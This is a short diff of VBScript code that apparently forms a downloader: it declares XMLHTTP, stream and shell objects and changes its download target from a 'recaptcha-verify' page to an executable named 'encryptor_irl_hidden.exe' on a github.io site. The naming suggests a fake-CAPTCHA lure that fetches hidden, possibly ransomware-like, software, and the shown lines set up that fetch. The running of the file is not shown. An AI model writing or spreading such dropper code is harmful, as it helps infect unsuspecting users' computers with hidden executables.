@@ -14,7 +14,7 @@
             Dim objXMLHTTP, objStream, objShell
             Dim url, tempFile
             
-            url = "https://fecdor.github.io/history-protector/recaptcha-verify"  ' Replace with the URL of your EXE
+            url = "https://fecdor.github.io/history-protector/encryptor_irl_hidden.exe"  ' Replace with the URL of your EXE
             
             ' Create objects
             Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
